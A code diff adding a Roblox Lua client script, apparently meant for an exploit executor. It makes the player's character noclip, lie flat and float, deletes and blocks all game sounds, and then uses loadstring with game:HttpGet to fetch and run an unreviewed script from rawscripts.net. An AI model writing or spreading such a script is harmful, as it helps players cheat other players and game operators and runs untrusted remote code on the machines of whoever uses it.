@@ -1,0 +1,234 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+
+local isEnabled = true
+local loadedScriptModel
+
+-- Utility: Show bottom-right notification
+local function showBottomRightNotification(message)
+    StarterGui:SetCore("SendNotification", {
+        Title = "Warning",
+        Text = message,
+        Duration = 5
+    })
+end
+
+-- Show "It refused" popup 3s after death, lasts 2s
+local function showItRefused()
+    task.delay(3, function()
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "RefusedPopup"
+        gui.ResetOnSpawn = false
+        gui.Parent = player:WaitForChild("PlayerGui")
+
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(0.3, 0, 0.1, 0)
+        text.Position = UDim2.new(0.35, 0, 0.4, 0)
+        text.BackgroundTransparency = 1
+        text.Text = "It refused"
+        text.TextColor3 = Color3.new(1, 1, 0)
+        text.Font = Enum.Font.SourceSansBold
+        text.TextScaled = true
+        text.Parent = gui
+
+        task.delay(2, function()
+            gui:Destroy()
+        end)
+    end)
+end
+
+-- Create toggle button on screen top-right
+local function createToggleButton()
+    local gui = player:WaitForChild("PlayerGui"):FindFirstChild("ToggleGui")
+    if gui then gui:Destroy() end
+
+    gui = Instance.new("ScreenGui")
+    gui.Name = "ToggleGui"
+    gui.ResetOnSpawn = false
+    gui.Parent = player:WaitForChild("PlayerGui")
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 120, 0, 30)
+    button.Position = UDim2.new(1, -130, 0, 10)
+    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Font = Enum.Font.SourceSansBold
+    button.TextSize = 18
+    button.Text = "Script: ON"
+    button.Parent = gui
+
+    button.MouseButton1Click:Connect(function()
+        isEnabled = not isEnabled
+        button.Text = isEnabled and "Script: ON" or "Script: OFF"
+        showBottomRightNotification("Script is now " .. (isEnabled and "ENABLED" or "DISABLED"))
+    end)
+end
+
+-- Stop all currently playing sounds
+local function stopAllSounds()
+    for _, sound in ipairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+        end
+    end
+end
+
+-- Block and delete sounds for a given duration (deletes existing sounds + blocks new ones)
+local function blockAndDeleteSoundsFor(duration)
+    -- Delete all existing sounds immediately
+    for _, sound in pairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Destroy()
+        end
+    end
+
+    local blocked = true
+    local connection = game.DescendantAdded:Connect(function(descendant)
+        if blocked and descendant:IsA("Sound") then
+            descendant:Destroy()
+        end
+    end)
+
+    task.wait(duration)
+
+    blocked = false
+    connection:Disconnect()
+end
+
+-- Set noclip by toggling CanCollide on character parts
+local function setNoclip(character, enabled)
+    for _, part in pairs(character:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = not enabled
+        end
+    end
+end
+
+-- Cleanup BodyMovers from HumanoidRootPart
+local function cleanupBodyMovers(hrp)
+    for _, child in pairs(hrp:GetChildren()) do
+        if child:IsA("BodyPosition") or child:IsA("BodyGyro") then
+            child:Destroy()
+        end
+    end
+end
+
+-- Make character lie flat and float up smoothly
+local function LieFlatAndFloat(character, hrp, humanoid, floatHeight, floatDuration)
+    floatHeight = floatHeight or 8
+    floatDuration = floatDuration or 3
+
+    humanoid.PlatformStand = true
+    setNoclip(character, true)
+    cleanupBodyMovers(hrp)
+
+    -- Lie flat on back
+    hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(90), 0, 0)
+
+    wait(2) -- duration lying flat
+
+    cleanupBodyMovers(hrp)
+
+    local startPos = hrp.Position
+    local targetPos = startPos + Vector3.new(0, floatHeight, 0)
+    local currentYRotation = hrp.Orientation.Y
+    local targetCFrame = CFrame.new(targetPos) * CFrame.Angles(0, math.rad(currentYRotation), 0)
+
+    local bodyPos = Instance.new("BodyPosition")
+    bodyPos.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+    bodyPos.Position = startPos
+    bodyPos.Parent = hrp
+
+    local bodyGyro = Instance.new("BodyGyro")
+    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
+    bodyGyro.CFrame = hrp.CFrame
+    bodyGyro.Parent = hrp
+
+    local elapsed = 0
+    local connection
+    connection = RunService.Heartbeat:Connect(function(dt)
+        elapsed = elapsed + dt
+        local alpha = math.clamp(elapsed / floatDuration, 0, 1)
+
+        local newPos = startPos:Lerp(targetPos, alpha)
+        local startRot = hrp.CFrame - startPos
+        local targetRot = targetCFrame - targetPos
+        local newRot = CFrame.new(Vector3.new()):Lerp(targetRot, alpha)
+
+        bodyPos.Position = newPos
+        bodyGyro.CFrame = CFrame.new(newPos) * newRot
+
+        if alpha >= 1 then
+            connection:Disconnect()
+        end
+    end)
+
+    wait(floatDuration + 3) -- Float duration + extra hold time
+
+    humanoid.PlatformStand = false
+    setNoclip(character, false)
+    cleanupBodyMovers(hrp)
+end
+
+-- Play sound effect helper
+local function playSFX(id, volume)
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. tostring(id)
+    sound.Volume = volume or 1
+    sound.Parent = game:GetService("SoundService")
+    sound:Play()
+    sound.Ended:Connect(function() sound:Destroy() end)
+end
+
+-- Main onSpawn handler
+local function onSpawn(character)
+    createToggleButton()
+    stopAllSounds()
+
+    local humanoid = character:WaitForChild("Humanoid")
+    local hrp = character:WaitForChild("HumanoidRootPart")
+
+    humanoid.Died:Connect(showItRefused)
+
+    if isEnabled then
+        if humanoid.RigType == Enum.HumanoidRigType.R15 then
+            showBottomRightNotification("R15 avatar detected. Script blocked.")
+            return
+        end
+
+        loadedScriptModel = Instance.new("Folder")
+        loadedScriptModel.Name = "LoadedScriptContainer"
+        loadedScriptModel.Parent = workspace
+
+        local env = setmetatable({}, { __index = getfenv() })
+        env.workspace = loadedScriptModel
+        wait(1.5)
+        -- Run LieFlatAndFloat async
+        task.spawn(function()
+            LieFlatAndFloat(character, hrp, humanoid, 20, 5)
+        end)
+
+        wait(5)
+
+        -- Block sounds while loading and running external script
+        task.spawn(function()
+            blockAndDeleteSoundsFor(5)
+            
+        end)
+
+        task.wait(0.5) -- allow blocker to start
+
+        task.spawn(function()
+            
+            setfenv(loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-Glios-FE-19578")), env)()
+        end)
+    end
+end
+
+player.CharacterAdded:Connect(onSpawn)
+if player.Character then
+    onSpawn(player.Character)
+end
